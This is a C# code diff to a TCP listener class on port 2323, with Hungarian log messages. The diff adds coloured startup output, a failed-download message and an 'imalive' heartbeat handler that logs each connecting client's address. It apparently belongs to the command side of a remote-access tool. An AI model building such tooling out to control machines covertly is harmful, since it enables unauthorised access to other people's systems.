@@ -16,15 +16,23 @@ namespace negnox.Classok
 {
     public class TCPHelper
     {
-
+        public static TcpListener listener;
         public static async Task listen()
         {
-            TcpListener listener = new TcpListener(IPAddress.Any, 2323);
+            listener = new TcpListener(IPAddress.Any, 2323);
             listener.Start();
-            //Console.ForegroundColor = ConsoleColor.Magenta;
-            //Console.WriteLine("[Listener elindult...]");
-            //Console.ForegroundColor = ConsoleColor.Gray;
-
+            Console.ForegroundColor = ConsoleColor.Gray;
+            Console.Write("[");
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.Write("+");
+            Console.ForegroundColor = ConsoleColor.Gray;
+            Console.Write("] ");
+            Console.ForegroundColor = ConsoleColor.Gray;
+            Console.Write("[");
+            Console.ForegroundColor = ConsoleColor.Magenta;
+            Console.Write("Listener elindult...");
+            Console.ForegroundColor = ConsoleColor.Gray;
+            Console.WriteLine("]");
             while (true)
             {
                 TcpClient client = await listener.AcceptTcpClientAsync();
@@ -219,7 +227,7 @@ namespace negnox.Classok
                             if (isPromptLive) WritePrompt();
                             break;
                         case "download":
-                            Log("$Nem sikerült a letöltés$");
+                            Log("[!] [$Nem sikerült a letöltés$]");
                             if (isPromptLive) WritePrompt();
                             break;
 
@@ -232,7 +240,11 @@ namespace negnox.Classok
                             Log(adat[1]);
                             break;
 
-
+                        case "imalive":
+                            if (isPromptLive) Console.WriteLine();
+                            Log($"[-] [÷{client.Client.RemoteEndPoint}÷ is |alive|]");
+                            if (isPromptLive) WritePrompt();
+                            break;
 
                         default:
                             break;
